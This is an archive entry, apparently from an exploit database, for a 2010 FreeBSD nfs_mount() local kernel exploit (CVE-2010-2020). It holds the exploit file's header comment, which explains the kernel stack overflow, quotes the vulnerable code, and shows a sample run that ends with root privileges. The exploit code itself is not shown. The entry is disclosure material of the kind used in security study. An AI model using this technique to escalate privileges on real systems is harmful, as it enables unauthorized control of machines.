{
    "text": "title : nfs_mount (  ) Local Denial Of Service / Privilege Escalation  ， detail : Local kernel exploit for nfs_mount (  ) on FreeBSD versions 8.0 , 7.3 and 7.2. It escalates privileges on versions 7.2 and 7.3 and causes a denial of service on 8.0.  ， cve : advisories | CVE-2010-2020  ，  ， desc : / *   ，  * nfs_mount_ex.c - Patroklos Argyroudis , argp at domain census-labs.com  ，  ，  * Local kernel exploit for FreeBSD 8.0 , 7.3 and 7.2.  ，  ，  * FreeBSD 8.0-RELEASE : Local kernel crash/denial-of-service.  ，  * FreeBSD 7.3/7.2-RELEASE : Local privilege escalation.  ，  ，  * Discovered and exploited by Patroklos ( argp ) Argyroudis.  ，  ，  * The vulnerability is in nfs_mount (  ) which is reachable by the mount ( 2 )   ，  * and nmount ( 2 ) system calls. In order for them to be enabled for  ，  * unprivileged users the sysctl ( 8 ) variable vfs.usermount must be set to a  ，  * non-zero value.  ，  ，  * nfs_mount (  ) employs an insufficient input validation method for copying  ，  * data passed in the struct nfs_args from userspace to kernel.  ，  * Specifically , the file handle to be mounted ( nfs_args.fh ) and its size  ，  *  ( nfs_args.fhsize ) are completely user-controllable. In file  ，  * sys/nfsclient/nfs_vfsops.c from 8.0-RELEASE :   ，  ，  * 1094 if (  ! has_fh_opt ) {  ，  * 1095 error = copyin ( caddr_t ) args.fh ,  ( caddr_t ) nfh ,   ，  * 1096 args.fhsize )  ;   ，  * 1097 if ( error ) {  ，  * 1098 goto out ;   ，  * 1099 }  ，  ，  * The above can cause a kernel stack overflow which leads to privilege  ，  * escalation in 7.3-RELEASE and 7.2-RELEASE , and a kernel crash /  ，  * denial-of-service in 8.0-RELEASE ( due to SSP/ProPolice ) . 7.1-RELEASE  ，  * and earlier do not seem to be vulnerable since the bug was introduced in  ，  * 7.2-RELEASE.  ，  ，  * Sample run :   ，  ，  *  [ argp @ julius ~  ]  $ uname -rsi  ，  * FreeBSD 7.3-RELEASE GENERIC  ，  *  [ argp @ julius ~  ]  $ sysctl vfs.usermount  ，  * vfs.usermount : 1  ，  *  [ argp @ julius ~  ]  $ id  ，  * uid=1001 ( argp ) gid=1001 ( argp ) groups=1001 ( argp )   ，  *  [ argp @ julius ~  ]  $ gcc -Wall nfs_mount_ex.c -o nfs_mount_ex  ，  *  [ argp @ julius ~  ]  $ ./nfs_mount_ex  ，  *  [  *  ] calling nmount (  )   ，  *  [  !  ] nmount error : -1030740736  ，  * nmount : Unknown error : -1030740736  ，  *  [ argp @ julius ~  ]  $ id  ，  * uid=0 ( root ) gid=0 ( wheel ) egid=1001 ( argp ) groups=1001 ( argp )   ，  ，  *  $ Id : nfs_mount_ex.c , v c1302ea1317d 2010/05/23 17 : 30 : 17 argp $ ",
    "time": "May 28, 2010"
}